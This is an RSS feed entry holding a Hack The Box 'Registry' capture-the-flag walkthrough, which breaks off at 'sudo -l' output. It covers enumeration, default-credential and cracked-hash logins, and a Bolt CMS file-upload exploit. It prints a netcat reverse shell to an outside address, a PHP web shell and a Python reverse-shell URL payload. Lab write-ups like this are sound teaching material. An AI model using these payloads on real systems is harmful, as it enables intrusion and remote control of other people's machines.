<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>My pentest notes</title>
    <description>Pentest notes
</description>
    <link>http://localhost:4000/</link>
    <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml"/>
    <pubDate>Sat, 04 Apr 2020 14:47:46 -0300</pubDate>
    <lastBuildDate>Sat, 04 Apr 2020 14:47:46 -0300</lastBuildDate>
    <generator>Jekyll v3.8.6</generator>
    
      <item>
        <title>Hack the box Registry Walkthrough</title>
        <description>&lt;p&gt;&lt;small&gt; &lt;i&gt; Tags: HACKTHEBOX | DOCKER | BOLT | CMS | REGISTRY | HARD &lt;/i&gt; &lt;/small&gt;&lt;/p&gt;

&lt;h2 id=&quot;nmap&quot;&gt;Nmap&lt;/h2&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap 10.10.10.159 -sV -sC -oA scan/stdscan 
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-03 08:53 EDT
Nmap scan report for 10.10.10.159
Host is up (0.11s latency).
Not shown: 997 closed ports
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 72:d4:8d:da:ff:9b:94:2a:ee:55:0c:04:30:71:88:93 (RSA)
|   256 c7:40:d0:0e:e4:97:4a:4f:f9:fb:b2:0b:33:99:48:6d (ECDSA)
|_  256 78:34:80:14:a1:3d:56:12:b4:0a:98:1f:e6:b4:e8:93 (ED25519)
80/tcp  open  http     nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Welcome to nginx!
443/tcp open  ssl/http nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Welcome to nginx!
| ssl-cert: Subject: commonName=docker.registry.htb
| Not valid before: 2019-05-06T21:14:35
|_Not valid after:  2029-05-03T21:14:35
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Running &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap&lt;/code&gt;we can spot three services running&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;SSH 22/TCP&lt;/li&gt;
  &lt;li&gt;HTTP 80/TCP&lt;/li&gt;
  &lt;li&gt;HTTPS 443/TCP&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;There’s a very importante information being leaked at the SSL Certificate, a subdomain &lt;code class=&quot;highlighter-rouge&quot;&gt;docker.registry.htb&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;So let’s update our &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts/&lt;/code&gt;file&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;danps@pwnbox:~/hackthebox$ cat /etc/hosts
127.0.0.1	localhost
127.0.1.1	pwnbox
10.10.10.159    registry.htb docker.registry.htb


# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;registryhtb&quot;&gt;registry.htb&lt;/h2&gt;

&lt;p&gt;Going into the main website we see just this default nginx page. I used a tool called &lt;code class=&quot;highlighter-rouge&quot;&gt;rustbuster&lt;/code&gt;to find some new directories.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;danps@pwnbox:~/hackthebox$ rustbuster dir -u &quot;http://registry.htb&quot; -w /usr/share/wordlists/dirb/common.txt  --no-banner
~ rustbuster v3.0.3 ~ by phra &amp;amp; ps1dr3x ~

[?] Started at	: 2020-04-03 09:12:32

GET	200 OK				http://registry.htb/
GET     403 Forbidden                   http://registry.htb/.bash_history
GET     403 Forbidden                   http://registry.htb/.hta
GET     403 Forbidden                   http://registry.htb/.htaccess
GET     403 Forbidden                   http://registry.htb/.htpasswd
GET     200 OK                          http://registry.htb/index.html
GET     301 Moved Permanently           http://registry.htb/install
						=&amp;gt; http://registry.htb/install/
  [00:00:51] ########################################    4611/4611    ETA: 00:00:00 req/s: 90
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/img/jekyll/8/registry_main_install.png&quot; alt=&quot;registry_main_install&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;rustbuster&lt;/code&gt; found a &lt;code class=&quot;highlighter-rouge&quot;&gt;/install&lt;/code&gt; directory. Browsing there, we find a bunch o gibberish that’s clearly a file, we can download with &lt;code class=&quot;highlighter-rouge&quot;&gt;curl&lt;/code&gt;and save it locally.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl http://registry.htb/install/ &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;install&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Extracting the file we just got, we see two files&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Readme.md&lt;/li&gt;
  &lt;li&gt;ca.crt&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;danps@pwnbox:~/hackthebox/registry$ cat readme.md 
# Private Docker Registry

- https://docs.docker.com/registry/deploying/
- https://docs.docker.com/engine/security/certificates/
danps@pwnbox:~/hackthebox/registry$ cat ca.crt 
-----BEGIN CERTIFICATE-----
MIIC/DCCAeSgAwIBAgIJAIFtFmFVTwEtMA0GCSqGSIb3DQEBCwUAMBMxETAPBgNV
BAMMCFJlZ2lzdHJ5MB4XDTE5MDUwNjIxMTQzNVoXDTI5MDUwMzIxMTQzNVowEzER
MA8GA1UEAwwIUmVnaXN0cnkwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIB
AQCw9BmNspBdfyc4Mt+teUfAVhepjje0/JE0db9Iqmk1DpjjWfrACum1onvabI/5
T5ryXgWb9kS8C6gzslFfPhr7tTmpCilaLPAJzHTDhK+HQCMoAhDzKXikE2dSpsJ5
zZKaJbmtS6f3qLjjJzMPqyMdt/i4kn2rp0ZPd+58pIk8Ez8C8pB1tO7j3+QAe9wc
r6vx1PYvwOYW7eg7TEfQmmQt/orFs7o6uZ1MrnbEKbZ6+bsPXLDt46EvHmBDdUn1
zGTzI3Y2UMpO7RXEN06s6tH4ufpaxlppgOnR2hSvwSXrWyVh2DVG1ZZu+lLt4eHI
qFJvJr5k/xd0N+B+v2HrCOhfAgMBAAGjUzBRMB0GA1UdDgQWBBTpKeRSEzvTkuWX
8/wn9z3DPYAQ9zAfBgNVHSMEGDAWgBTpKeRSEzvTkuWX8/wn9z3DPYAQ9zAPBgNV
HRMBAf8EBTADAQH/MA0GCSqGSIb3DQEBCwUAA4IBAQABLgN9x0QNM+hgJIHvTEN3
LAoh4Dm2X5qYe/ZntCKW+ppBrXLmkOm16kjJx6wMIvUNOKqw2H5VsHpTjBSZfnEJ
UmuPHWhvCFzhGZJjKE+An1V4oAiBeQeEkE4I8nKJsfKJ0iFOzjZObBtY2xGkMz6N
7JVeEp9vdmuj7/PMkctD62mxkMAwnLiJejtba2+9xFKMOe/asRAjfQeLPsLNMdrr
CUxTiXEECxFPGnbzHdbtHaHqCirEB7wt+Zhh3wYFVcN83b7n7jzKy34DNkQdIxt9
QMPjq1S5SqXJqzop4OnthgWlwggSe/6z8ZTuDjdNIpx0tF77arh2rUOIXKIerx5B
-----END CERTIFICATE-----
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The first one we see some links about &lt;code class=&quot;highlighter-rouge&quot;&gt;docker registry&lt;/code&gt; , and the &lt;code class=&quot;highlighter-rouge&quot;&gt;ca.crt&lt;/code&gt;is a file that allow us to login to this private registry? We still don’t know.&lt;/p&gt;

&lt;h2 id=&quot;dockerregistryhtb&quot;&gt;docker.registry.htb&lt;/h2&gt;

&lt;p&gt;&lt;img src=&quot;/img/jekyll/8/docker_registry.png&quot; alt=&quot;docker_registry&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Another blank page, running &lt;code class=&quot;highlighter-rouge&quot;&gt;rustbuster&lt;/code&gt;again.&lt;/p&gt;

&lt;div class=&quot;language-terminal highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;danps@pwnbox:~/hackthebox/registry$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;rustbuster &lt;span class=&quot;nb&quot;&gt;dir&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;http://docker.registry.htb/&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /usr/share/wordlists/dirb/common.txt  &lt;span class=&quot;nt&quot;&gt;--no-banner&lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;~ rustbuster v3.0.3 ~ by phra &amp;amp; ps1dr3x ~

[?] Started at	: 2020-04-03 10:47:24

GET	200 OK				                      http://docker.registry.htb/
GET     301 Moved Permanently           http://docker.registry.htb/v2
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;						=&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;/v2/
&lt;span class=&quot;gp&quot;&gt;  [00:00:51] #&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;#######################################    4611/4611    ETA: 00:00:00 req/s: 90&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We find a &lt;code class=&quot;highlighter-rouge&quot;&gt;v2&lt;/code&gt;directory.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/jekyll/8/registry_v2.png&quot; alt=&quot;registry_v2&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;It ask us for a &lt;code class=&quot;highlighter-rouge&quot;&gt;user&lt;/code&gt;and &lt;code class=&quot;highlighter-rouge&quot;&gt;password&lt;/code&gt;. I think this part was a bit of guessing but the first thing that I always try is &lt;code class=&quot;highlighter-rouge&quot;&gt;admin:admin&lt;/code&gt; and this time it worked.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/jekyll/8/registry_empty.png&quot; alt=&quot;registry_empty&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;But we only get these empty curly braces.&lt;/p&gt;

&lt;h2 id=&quot;docker-login&quot;&gt;Docker Login&lt;/h2&gt;

&lt;p&gt;Knowing that we’re dealing with a &lt;code class=&quot;highlighter-rouge&quot;&gt;docker registry&lt;/code&gt; we can try to login to this and check out its images.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;danps@pwnbox:~/hackthebox/registry$ sudo docker login docker.registry.htb
Username: admin
Password: 
Error response from daemon: Get https://docker.registry.htb/v2/: x509: certificate signed by unknown authority
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;According to the official docker documentation, we need to add some valid certificates to make it work&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/etc/docker/certs.d/           &amp;lt;-- Certificate directory
    └── docker.registry.htb    &amp;lt;-- Hostname:port
       ├── client.cert         &amp;lt;-- Client certificate
       ├── client.key          &amp;lt;-- Client key
       └── ca.crt              &amp;lt;-- Certificate authority that signed
                                    the registry certificate (the one we extracted from            																																		the install zip)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;First, we generate our client certificate&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;openssl genrsa &lt;span class=&quot;nt&quot;&gt;-out&lt;/span&gt; client.key 4096
openssl req &lt;span class=&quot;nt&quot;&gt;-new&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-x509&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-text&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-key&lt;/span&gt; client.key &lt;span class=&quot;nt&quot;&gt;-out&lt;/span&gt; client.cert
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Now we create a folder inside &lt;code class=&quot;highlighter-rouge&quot;&gt;certs.d&lt;/code&gt; and move the certificates. In the end it should look like this&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;danps@pwnbox:/etc/docker/certs.d$ tree
.
└── docker.registry.htb
    ├── ca.crt
    ├── client.cert
    └── client.key

1 directory, 3 files
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;If we try to login again, we succeed&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;danps@pwnbox:~/hackthebox/registry/certs$ sudo docker login docker.registry.htb
Username: admin
Password: 
WARNING! Your password will be stored unencrypted in /root/.docker/config.json.
Configure a credential helper to remove this warning. See
https://docs.docker.com/engine/reference/commandline/login/#credentials-store

Login Succeeded
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;To find what images are stored in this register we can browse to &lt;code class=&quot;highlighter-rouge&quot;&gt;_catalog&lt;/code&gt; inside the &lt;code class=&quot;highlighter-rouge&quot;&gt;/v2&lt;/code&gt;dir.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/jekyll/8/registry_bolt-image.png&quot; alt=&quot;registry_bolt-image&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We discover a &lt;code class=&quot;highlighter-rouge&quot;&gt;bolt-image&lt;/code&gt;, let’s pull and run it locally.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;docker pull docker.registry.htb/bolt-image
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;danps@pwnbox:~/hackthebox/registry$ sudo docker images
REPOSITORY                       TAG                 IMAGE ID            CREATED             SIZE
docker.registry.htb/bolt-image   latest              601499e98a60        10 months ago       362MB
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Now let’s enumerate it to see if we find any valid credentials.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;docker run &lt;span class=&quot;nt&quot;&gt;-it&lt;/span&gt; docker.registry.htb/bolt-image
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Inside the container we can see a &lt;code class=&quot;highlighter-rouge&quot;&gt;.ssh&lt;/code&gt;file inside the &lt;code class=&quot;highlighter-rouge&quot;&gt;root&lt;/code&gt; directory.&lt;/p&gt;

&lt;p&gt;Looking at the the &lt;code class=&quot;highlighter-rouge&quot;&gt;id_rsa.pub&lt;/code&gt; file we can see an user &lt;code class=&quot;highlighter-rouge&quot;&gt;bolt&lt;/code&gt;. Another interesting file is &lt;code class=&quot;highlighter-rouge&quot;&gt;id_rsa&lt;/code&gt; which contains the bolt user’s private key, however it is encrypted.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@870d4f2aab64:~/.ssh# cat id_rsa
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,1C98FA248505F287CCC597A59CF83AB9
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;At first I thought I had to brute force this, but it did not work so I went back to enumerate more the machine.&lt;/p&gt;

&lt;p&gt;Looking at the &lt;code class=&quot;highlighter-rouge&quot;&gt;.viminfo&lt;/code&gt;file inside the &lt;code class=&quot;highlighter-rouge&quot;&gt;root&lt;/code&gt;directory I noticed some references to &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/profile.d/01-ssh.sh&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@870d4f2aab64:~# cat /etc/profile.d/01-ssh.sh 
#!/usr/bin/expect -f
#eval `ssh-agent -s`
spawn ssh-add /root/.ssh/id_rsa
expect &quot;Enter passphrase for /root/.ssh/id_rsa:&quot;
send &quot;GkOcz221Ftb3ugog\n&quot;;
expect &quot;Identity added: /root/.ssh/id_rsa (/root/.ssh/id_rsa)&quot;
interact
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;It turned out to be a script to add and put the password to the &lt;code class=&quot;highlighter-rouge&quot;&gt;id_rsa&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Credentials&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;bolt&lt;/li&gt;
  &lt;li&gt;id_rsa
    &lt;ul&gt;
      &lt;li&gt;GkOcz221Ftb3ugog&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Let’s login.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;danps@pwnbox:~/hackthebox/registry$ ssh -i id_rsa bolt@registry.htb
Enter passphrase for key 'id_rsa': 
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-65-generic x86_64)

  System information as of Fri Apr  3 15:54:38 UTC 2020

  System load:  0.0               Users logged in:                0
  Usage of /:   5.6% of 61.80GB   IP address for eth0:            10.10.10.159
  Memory usage: 23%               IP address for br-1bad9bd75d17: 172.18.0.1
  Swap usage:   0%                IP address for docker0:         172.17.0.1
  Processes:    154
Last login: Fri Apr  3 15:53:46 2020 from 10.10.14.38
bolt@bolt:~$ 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Now that we’re inside, let’s fetch our &lt;code class=&quot;highlighter-rouge&quot;&gt;user.txt&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bolt@bolt:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;user.txt
ytc0ytdmnz&amp;lt;redacted&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;privilege-escalation&quot;&gt;Privilege Escalation&lt;/h2&gt;

&lt;p&gt;I always like to initiate this part running some default enumeration scripts to get some general idea of what I have to do. In this case I discovered that &lt;code class=&quot;highlighter-rouge&quot;&gt;bolt&lt;/code&gt;is actually a content management system (CMS). There are a few interesting files that we have to analyze to figure out our attack plan.&lt;/p&gt;

&lt;p&gt;Browsing the &lt;code class=&quot;highlighter-rouge&quot;&gt;/var/www/html&lt;/code&gt;folder, we see an interesting file called &lt;code class=&quot;highlighter-rouge&quot;&gt;backup.php&lt;/code&gt; which has the following script&lt;/p&gt;

&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt; 
  &lt;span class=&quot;nb&quot;&gt;shell_exec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;sudo restic backup -r rest:http://backup.registry.htb/bolt bolt&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;When I saw this, I realized that the user &lt;code class=&quot;highlighter-rouge&quot;&gt;www-data&lt;/code&gt;can run &lt;code class=&quot;highlighter-rouge&quot;&gt;restic&lt;/code&gt;as root without a password. So the current attack plan is:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Exploit the bolt website to get a shell as &lt;code class=&quot;highlighter-rouge&quot;&gt;www-data&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;Confirm the theory about &lt;code class=&quot;highlighter-rouge&quot;&gt;restic&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;Exploit &lt;code class=&quot;highlighter-rouge&quot;&gt;restic&lt;/code&gt;to read the root.txt file&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;exploiting-bolt-cms&quot;&gt;Exploiting Bolt CMS&lt;/h2&gt;

&lt;p&gt;Googling a bit about bolt RCEs, I found this great &lt;a href=&quot;https://fgsec.net/from-csrf-to-rce-bolt-cms/&quot;&gt;article&lt;/a&gt; that says that basically an authanticated user can write to a &lt;code class=&quot;highlighter-rouge&quot;&gt;config.yml&lt;/code&gt;and change the file extensions that the application allows us to upload.But before we get there we need some admin credentials to login.&lt;/p&gt;

&lt;p&gt;Searching the web files and configs, we find a &lt;code class=&quot;highlighter-rouge&quot;&gt;/var/www/html/bolt/app/database/bolt.db&lt;/code&gt;which is very likely to have our credential stored.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;strings /var/www/html/bolt/app/database/bolt.db
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;we find&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;admin $2y$10$e.ChUytg9SrL7AsboF2bX.wWKQ1LkS5Fi3/Z0yYD86.P5E9cpY7PK
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Which looks like a username and a hashed password. Running it in &lt;code class=&quot;highlighter-rouge&quot;&gt;John the ripper&lt;/code&gt;It says it is a bcrypt hash and using &lt;code class=&quot;highlighter-rouge&quot;&gt;rockyou.txt&lt;/code&gt; for a dictionary attack we find the password &lt;code class=&quot;highlighter-rouge&quot;&gt;strawberry&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;john hash -w /usr/share/wordlists/rockyou.txt --format=bcrypt
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;Credentials&lt;/strong&gt;:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;admin&lt;/li&gt;
  &lt;li&gt;strawberry&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;And we login&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/jekyll/8/registry_bolt_login.png&quot; alt=&quot;registry_bolt_login&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now we just replay the steps desribed in the article I mentioned. First we need to change the &lt;code class=&quot;highlighter-rouge&quot;&gt;accepted_file_types&lt;/code&gt;in the config.yml file.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/jekyll/8/registry_edit.png&quot; alt=&quot;registry_edit&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We just add &lt;code class=&quot;highlighter-rouge&quot;&gt;php&lt;/code&gt; to this list and now we can upload php files.&lt;/p&gt;

&lt;p&gt;One thing that is important to point out is that this particular box is not allowing us to make outbounds connections, which means that if I create a file to get a reverse shell, it would be something like this:&lt;/p&gt;

&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;  
&lt;span class=&quot;nb&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;nc 10.10.14.38 9091 -e /bin/bash&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;But since there’s this protection this would just fail. I struggled a bit to realize that I didn’t actually had to leave the box. Since I had a decent SSH Shell, I could just start a netcat listener on the box and connect to it using localhost.&lt;/p&gt;

&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;  
&lt;span class=&quot;nb&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'cmd'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://registry.htb/bolt/files/shell.php?cmd=python%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22localhost%22,9091));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/bash%22,%22-i%22]);%27
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Let’s upload a file here&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/jekyll/8/registry_upload.png&quot; alt=&quot;registry_upload&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We fire up our netcat on the registry machine on port 9091 and get our new shell!&lt;/p&gt;

&lt;p&gt;Ok, we are &lt;code class=&quot;highlighter-rouge&quot;&gt;www-data&lt;/code&gt;now&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@bolt:~/html/bolt/files$ whoami
whoami
www-data
www-data@bolt:~/html/bolt/files$ 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;To confirm out theory about &lt;code class=&quot;highlighter-rouge&quot;&gt;www-data&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;restic&lt;/code&gt;we run &lt;code class=&quot;highlighter-rouge&quot;&gt;sudo -l&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@bolt:~/html/bolt/files$ sudo -l
sudo -l
Matching Defaults entries for www-data on bolt:
    env_reset, exempt_group=sudo, mail_badpass,
